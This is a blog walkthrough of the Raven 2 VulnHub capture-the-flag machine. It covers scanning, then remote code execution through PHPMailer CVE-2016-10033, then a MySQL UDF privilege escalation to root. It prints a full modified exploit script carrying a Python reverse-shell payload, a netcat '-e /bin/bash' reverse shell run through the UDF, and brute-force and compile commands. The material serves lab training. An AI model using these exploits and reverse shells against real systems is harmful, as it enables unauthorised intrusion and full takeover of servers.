---
layout:     single
classes:    wide
title:      "VulnHub: Raven 2 Walkthrough"
subtitle:   "A walkthrough of the Raven 2 Machine on VulnHub."
date:       2019-03-19 12:00:00
categories: ctf vulnhub
---

* * *
<p>
Writeup for the <a href='https://www.vulnhub.com/entry/raven-2,269/' target="_blank">Raven 2</a> 
machine from VulnHub. The second iteration of the Raven box, now with decent SSH credentials. A directory-busting scan reveals a folder containing a vulnerable version of PHPMailer, which we can exploit to get a web shell. After many adjustments, we get the exploit working and get a foothold. After some enumeration, we discover that the MySQL credentials are in the same place as before, and that MySQL is running with root privileges. After confirming the MySQL version, we use a UDF exploit to spawn a root shell.
</p>
* * *

<p>As usual, we start off with an nmap scan:
<code><a href='https://explainshell.com/explain?cmd=nmap+-sC+-sV+-oN+Raven2+192.168.1.23' target="_blank">nmap -sC -sV -oN Raven2 192.168.1.23</a></code>
</p>

```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-17 17:39 EDT
Nmap scan report for 192.168.1.23       
Host is up (0.000067s latency).         
Not shown: 997 closed ports            
PORT    STATE SERVICE VERSION                          
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:                                                                                
|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA) 
|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))                                                                                                                                        
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Raven Security              
111/tcp open  rpcbind 2-4 (RPC #100000)                                    
| rpcinfo:                            
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind                                                                                                                                                  
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          48438/tcp  status  
|_  100024  1          55058/udp  status    
MAC Address: 00:0C:29:E6:74:52 (VMware)         
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
<p>
You can see that it's an Apache server running the Raven Security website, same as last time. 
Feel free to navigate to it in a web browser and click around for a bit. 
</p>

<p>
It would be a good idea to get some other scans going while we're poking around. A full nmap scan:
<code><a href='https://explainshell.com/explain?cmd=nmap+-v+-p-+192.168.1.23' target="_blank">nmap -v -p- 192.168.1.23</a></code>
or a nikto scan: <code><a href='https://explainshell.com/explain?cmd=nikto+-host+192.168.1.23+-port+80' target="_blank">nikto -host 192.168.1.23 -port 80</a></code>
would be good to have going in the background.
</p>
<p> 
Let's try a directory busting scan first. I like gobuster, but feel free to use your tool of choice.
Gobuster scan: <code>gobuster -u 192.168.1.23 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code>.
</p>

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.1.23/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/03/17 18:40:44 Starting gobuster
=====================================================
/img (Status: 301)
/css (Status: 301)
/wordpress (Status: 301)
/manual (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
/fonts (Status: 301)
/server-status (Status: 403)
=====================================================
2019/03/17 18:41:05 Finished
=====================================================
```

<p>
That wordpress installation is still there. I decided to run another gobuster scan on the
wordpress directory to have for later:
<code>gobuster -u 192.168.1.23/wordpress -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .php,.txt</code>.
</p>

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.1.23/wordpress/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php,txt
[+] Timeout      : 10s
=====================================================
2019/03/17 18:43:57 Starting gobuster
=====================================================
/wp-content (Status: 301)
/license.txt (Status: 200)
/wp-includes (Status: 301)
/wp-login.php (Status: 200)
/index.php (Status: 301)
/wp-admin (Status: 301)
/wp-trackback.php (Status: 200)
/wp-signup.php (Status: 302)
=====================================================
2019/03/17 18:45:03 Finished
=====================================================
```
<p>
The /vendor directory looks interesting too.
</p>

![](/img/raven2_gobuster.png)

<p>
Navigating to PATH gets us the first flag: <code>flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}</code>.
Otherwise, it looks like this folder contains files for PHPMailer. VERSION tells us that it's
running version 5.2.16. That would be enough info to get us looking for an exploit, but SECURITY.md
is nice enough to give us a specific CVE to try.
</p>

```
SECURITY.md
# Security notices relating to PHPMailer

Please disclose any vulnerabilities found responsibly - report any security 
problems found to the maintainers privately.

PHPMailer versions prior to 5.2.18 (released December 2016) are vulnerable to 
[CVE-2016-10033](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10033) 
a remote code execution vulnerability, responsibly reported by [Dawid Golunski]
(https://legalhackers.com).

[...]
```
<p>
Before I started looking into CVE-2016-10033, I wanted to confirm that the entry point into
Raven 1 was actually patched. If you aren't familiar with the first box, weak credentials were 
the main issue. First, I wanted to check if wpscan picks up the same users as last
time:
</p>

```
$ wpscan --url http://192.168.1.23/wordpress -e --wp-content-dir wp-content
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.4.4
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[...]

[i] User(s) Identified:

[+] michael
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] steven
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```
<p>
Still just michael and steven. Just out of curiosity, I'll try hydra again:
<code><a href='https://explainshell.com/explain?cmd=hydra+-L+users.txt+-P+%2Fusr%2Fshare%2Fwordlists%2Frockyou.txt++-e+nsr+-o+hydra.log+-t8+-f+ssh%3A%2F%2F192.168.1.23' target="_blank">hydra -L users.txt -P /usr/share/wordlists/rockyou.txt  -e nsr -o hydra.log -t8 -f ssh://192.168.1.23</a></code>.
</p>

```
$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt  -e nsr -o hydra.log -t8 -f ssh://192.168.1.23
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-03-17 19:32:36
[DATA] max 8 tasks per 1 server, overall 8 tasks, 28688804 login tries (l:2/p:14344402), ~3586101 tries per task
[DATA] attacking ssh://192.168.1.23:22/
```
<p>
Last time we got a password in seconds, but no such luck this time. Lets move onto our CVE.
</p>

```
$ searchsploit phpmailer
----------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                           |  Path
                                                                                         | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------- ----------------------------------------
PHPMailer 1.7 - 'Data()' Remote Denial of Service                                        | exploits/php/dos/25752.txt
PHPMailer < 5.2.18 - Remote Code Execution (Bash)                                        | exploits/php/webapps/40968.php
PHPMailer < 5.2.18 - Remote Code Execution (PHP)                                         | exploits/php/webapps/40970.php
PHPMailer < 5.2.18 - Remote Code Execution (Python)                                      | exploits/php/webapps/40974.py
PHPMailer < 5.2.19 - Sendmail Argument Injection (Metasploit)                            | exploits/multiple/webapps/41688.rb
PHPMailer < 5.2.20 - Remote Code Execution                                               | exploits/php/webapps/40969.pl
PHPMailer < 5.2.20 / SwiftMailer < 5.4.5-DEV / Zend Framework / zend-mail < 2.4.11 - 'AI | exploits/php/webapps/40986.py
PHPMailer < 5.2.20 with Exim MTA - Remote Code Execution                                 | exploits/php/webapps/42221.py
PHPMailer < 5.2.21 - Local File Disclosure                                               | exploits/php/webapps/43056.py
WordPress PHPMailer 4.6 - Host Header Command Injection (Metasploit)                     | exploits/php/remote/42024.rb
----------------------------------------------------------------------------------------- ----------------------------------------

```

![](/img/raven2_phpmailercve.png)

<p>
I'll be using 40974.py, which works for the CVE we found. The exploitdb entry for it 
tells us that we can get RCE with this version of PHPMailer via a \" (backslash double quote) in the Sender (name)
field. Let's navigate to the contact page, found on <code>http://192.168.1.23/contact.php</code>. Just so we
can understand the exploit a little better, I'm going to submit a normal request through this form
and examine it in Burp.
</p>

![](/img/raven2_contactform.png)

![](/img/raven2_burp1.png)

<p>
And <a href='https://www.exploit-db.com/exploits/40974' target="_blank">here's the exploit</a>. Looks like it'll send a reverse shell as the payload through the name field,
as expected. Keep in mind this will need some modification to get it working:
</p>
1. Add <code># coding: utf-8</code> to the top of the file
2. Modify the target variable to wherever the contact page for Raven is
3. Modify the payload variable to connect back to your IP
4. Change the apache directory in the email field from <code>-X/www/backdoor.php</code> to <code>-X/var/www/html/whateveryounamedyourshell.php</code>

<p>
For reference, below you can find the version I used after all of the necessary modifications.
</p>

```
# coding: utf-8
"""
# Exploit Title: PHPMailer Exploit v1.0
# Date: 29/12/2016
# Exploit Author: Daniel aka anarc0der
# Version: PHPMailer < 5.2.18
# Tested on: Arch Linux
# CVE : CVE 2016-10033

Description:
Exploiting PHPMail with back connection (reverse shell) from the target

Usage:
1 - Download docker vulnerable enviroment at: https://github.com/opsxcq/exploit-CVE-2016-10033
2 - Config your IP for reverse shell on payload variable
4 - Open nc listener in one terminal: $ nc -lnvp <your ip>
3 - Open other terminal and run the exploit: python3 anarcoder.py

Video PoC: https://www.youtube.com/watch?v=DXeZxKr-qsU

Full Advisory:
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
"""

from requests_toolbelt import MultipartEncoder
import requests
import os
import base64
from lxml import html as lh

os.system('clear')
print("\n")
print(" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ ")
print("██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗")
print("███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝")
print("██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗")
print("██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║")
print("╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
print("      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com")
print(" Version 1.0 - github.com/anarcoder - greetings opsxcq & David Golunski\n")

target = 'http://192.168.1.23/contact.php'
backdoor = '/shell.php'

payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'192.168.1.22\\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'
fields={'action': 'submit',
        'name': payload,
        'email': '"anarcoder\\\" -OQueueDirectory=/tmp -X/var/www/html/shell.php server\" @protonmail.com',
        'message': 'Pwned'}

m = MultipartEncoder(fields=fields,
                     boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')

headers={'User-Agent': 'curl/7.47.0',
         'Content-Type': m.content_type}

proxies = {'http': 'localhost:8081', 'https':'localhost:8081'}


print('[+] SeNdiNG eVIl SHeLL To TaRGeT....')
r = requests.post(target, data=m.to_string(),
                  headers=headers)
print('[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D')
r = requests.get(target+backdoor, headers=headers)
if r.status_code == 200:
    print('[+]  ExPLoITeD ' + target)
```

<p>
Now start a netcat listener on the port specified in the payload. I used the default 4444:
<code><a href='https://explainshell.com/explain?cmd=nc+-lvnp+4444' target="_blank">nc -lvnp 4444</a></code>,
then start the exploit with <code>python 40974.py</code>. 
If you get <code>ModuleNotFoundError: No module named 'requests_toolbelt'</code>, you just
need to install requests_toolbelt for python using pip first: 
</p>

```
root@kali:~/Documents/VulnHub/Raven2# pip install requests_toolbelt                  
Collecting requests_toolbelt
  Downloading https://files.pythonhosted.org/packages/60/ef/7681134338fc097acef8d9b2f8abe0458e4d87559c689a8c306d0957ece5/requests_toolbelt-0.9.1-py2.py3-none-any.whl (54kB)
    100% |████████████████████████████████| 61kB 1.3MB/s  
Requirement already satisfied: requests<3.0.0,>=2.0.1 in /usr/lib/python2.7/dist-packages (from requests_toolbelt) (2.20.0)                                                                 
Installing collected packages: requests-toolbelt
Successfully installed requests-toolbelt-0.9.1   

root@kali:~/Documents/VulnHub/Raven2# python 40974.py
 █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ 
██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗
███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝
██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗
██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com
 Version 1.0 - github.com/anarcoder - greetings opsxcq & David Golunski

[+] SeNdiNG eVIl SHeLL To TaRGeT....
[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D
[+]  ExPLoITeD http://192.168.1.23/contact.php
```

<p>
Once that's working, navigate to <code>http://192.168.1.23/shell.php</code> or whatever
you named your shell. Your listener should pick it up and you'll get a low privilege shell.
</p>

```
root@kali:~/Documents/VulnHub/Raven2# nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.1.22] from (UNKNOWN) [192.168.1.23] 57208
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

<p>
Now we should use python to spawn a better shell to make our 
privesc less tedious: <code>python -c "import pty; pty.spawn('/bin/bash')"</code>
</p>

```
$ which python
/usr/bin/python
$ python -c "import pty; pty.spawn('/bin/bash')"
```
<p>
We finally have a foothold. Now we enumerate. I ran LinEnum.sh on the machine and discovered that MySQL was running as root (as well as a sendmail process). For a more detailed LinEnum example, check out the Raven 1 writeup. We could have acquired that same information via <code><a href='https://explainshell.com/explain?cmd=ps+aux+%7C+grep+root' target="_blank">ps aux | grep root</a></code>. This will give us any processes currently running as root.
</p>

```
www-data@Raven:/var/www/html$ ps aux | grep root
root        541  0.0  1.0  78088  4996 ?        Ss   Mar18   0:14 sendmail: MTA: accepting connections          
[...]
root        914  0.0  9.7 815148 47740 ?        Sl   Mar18   2:43 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
```

<p>
Now to find the MySQL version this box is running:        
</p>

```
www-data@Raven:/var/www/html$ dpkg -l | grep mysql
dpkg -l | grep mysql
ii  libdbd-mysql-perl              4.028-2+deb8u2                     amd64        Perl5 database interface to the MySQL database
ii  libmysqlclient18:amd64         5.5.60-0+deb8u1                    amd64        MySQL database client library
ii  mysql-client-5.5               5.5.60-0+deb8u1                    amd64        MySQL database client binaries
ii  mysql-common                   5.5.60-0+deb8u1                    all          MySQL database common files, e.g. /etc/mysql/my.cnf
ii  mysql-server                   5.5.60-0+deb8u1                    all          MySQL database server (metapackage depending on the latest version)
ii  mysql-server-5.5               5.5.60-0+deb8u1                    amd64        MySQL database server binaries and system database setup
ii  mysql-server-core-5.5          5.5.60-0+deb8u1                    amd64        MySQL database server binaries
ii  php5-mysqlnd                   5.6.36+dfsg-0+deb8u1               amd64        MySQL module for php5 (Native Driver)
```

<p>
It's running version 5.5. A cursory web search will tell us that this version of MySQL may be vulnerable to a type of UDF (User Defined Function) exploit. <a href='https://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html' target="_blank">More info here.</a> Searching further will lead us to a particular UDF exploit, <a href='https://www.exploit-db.com/exploits/1518' target="_blank">1518.c</a>. This exploit works by compiling the code into an .so file and inserting it into the database. This involves logging into the database, however. Lucky for us, Raven Security left the MySQL password in the same place since Raven 1, in the wp-config.php file.
</p>

```
www-data@Raven:/var/www/html/wordpress$ cat wp-config.php
[...]

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'R@v3nSecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
[...]
```
<p>
The password is R@v3nSecurity. Now we have everything we need to make this exploit work.
</p>

<h3>Exploitation</h3>
<p>
A UDF (User Defined Function) Library is a set of functions that are put into a table and can be called from inside MySQL. These can take the form of a Shared Object (.so) on Linux systems or DLLs on Windows. Since Raven is a Linux box, we'll be using a Shared Object file. You can find a reference for exploiting MySQL UDF on a Windows system at the bottom of this page as well. The function that 1518.c uses is called do_system, which can execute arbitrary system commands by passing <code>args->args[0]</code> into the system function. The command passed to the UDF will be executed in the context of current permissions for the database. Since MySQL is running as root, that means it will be executed with root privileges. We'll use this to spawn a root shell.        
</p>

<p>
As usual, follow the instructions on the exploit until things stop working. For me, this happened right at the start when I was compiling the C code. I couldn't get the given command to create the .so file to work: <code>gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</code>, even with making the neccesary modifications (filenames and such). So I found something else that did practically the same thing. Here's what ended up working for me: <code><a href='https://explainshell.com/explain?cmd=gcc+-shared+-fPIC+-o+1518.so+1518.c'>gcc -shared -fPIC -o 1518.so 1518.c</a></code>. After compiling the .so I used PythonHTTPServer + wget to get it onto the target machine, throwing it in <code>/var/www/html/</code>. (Example in Raven 1 writeup) You could also just compile it on the target machine instead, if you wanted to. From there, we can just follow the instructions on the exploit, making modifications as necessary.         
</p>

```
$ mysql -u root -p wordpress
mysql -u root -p wordpress
Enter password: R@v3nSecurity

[...]

mysql> use mysql
use mysql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob)
create table foo(line blob);
Query OK, 0 rows affected (0.00 sec)

mysql> insert into foo values(load_file('/var/www/html/1518.so'));
insert into foo values(load_file('/var/www/html/1518.so'));
Query OK, 1 row affected (0.01 sec)
```

<p>Going smoothly so far. This next step requires you to put the .so file into the MySQL plugin directory, the location of which can vary depending on the system. To find it, you can use the <code>@@plugin_dir</code> global variable in MySQL. It is <code>/usr/lib/mysql/plugin/</code> on this system.</p>

```
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname '1518.so';
create function do_system returns integer soname '1518.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select * from mysql.func;
select * from mysql.func;
+-----------+-----+---------+----------+
| name      | ret | dl      | type     |
+-----------+-----+---------+----------+
| do_system |   2 | 1518.so | function |
+-----------+-----+---------+----------+
1 row in set (0.01 sec)
```

<p>
I was having some trouble with the rest of the instructions, so I decided to just have it spawn a root shell using nc that I would then connect to on my machine.  Start a listener on your attacking machine with <code>nc -lvp 4444</code>, then connect to it by using nc in MySQL back on the victim machine.
</p>        

```
mysql> select do_system('nc -nv 192.168.1.16 4444 -e /bin/bash'); 
select do_system('nc -nv 192.168.1.16 4444 -e /bin/bash');
```

<p>Back on our listener:</p>
```
root@kali:~# nc -lvp 4444
listening on [any] 4444 ...
192.168.1.13: inverse host lookup failed: Unknown host
connect to [192.168.1.16] from (UNKNOWN) [192.168.1.13] 53117
whoami
root
```
<p>
We've got our root shell. Navigate to the root directory and grab flag 4.
</p>

```
# cat flag4.txt
cat flag4.txt
  ___                   ___ ___ 
 | _ \__ ___ _____ _ _ |_ _|_ _|
 |   / _` \ V / -_) ' \ | | | | 
 |_|_\__,_|\_/\___|_||_|___|___|
                           
flag4{df2bc5e951d91581467bb9a2a8ff4425}

CONGRATULATIONS on successfully rooting RavenII

I hope you enjoyed this second interation of the Raven VM

Hit me up on Twitter and let me know what you thought: 

@mccannwj / wjmccann.github.io
```

<p>
We missed flag 3 during all this, so I looked for it in the Wordpress directory.
</p>

```
www-data@Raven:/var$ find / -type f -name flag* 2>/dev/null
find / -type f -name flag* 2>/dev/null
/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png
/var/www/flag2.txt
/usr/share/doc/apache2-doc/manual/fr/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/en/rewrite/flags.html
/sys/devices/pci0000:00/0000:00:11.0/0000:02:01.0/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/platform/serial8250/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
```

<p>
It's a .png that was hidden in one of the wordpress uploads. We can't <code>cat</code> it, so you can just move it to /var/www/html/ so it's viewable in a web browser: <code>cp /var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png /var/www/html/</code>. Then navigate to http://YOUR-RAVEN-IP/flag3.png to grab it. You could also just transfer it to your own machine and read it there.
</p>

![](/img/raven2_flag3.png)

<h3>Conclusion</h3>
<p>This box had and interesting continuity with Raven 1; this version patched the most obvious issues with the poor SSH and Wordpress credentials, but left some misconfigurations like an outdated PHPMailer and MySQL running as root. In fact, you could follow this guide exactly for Raven 1, since all of the vulnerabilities used here are also present in the first box.</p>

<h3>Extra Resources</h3>
* <a href='https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf'>Exploiting UDF (Windows)</a>
* <a href='https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/'>More on exploiting UDF</a>
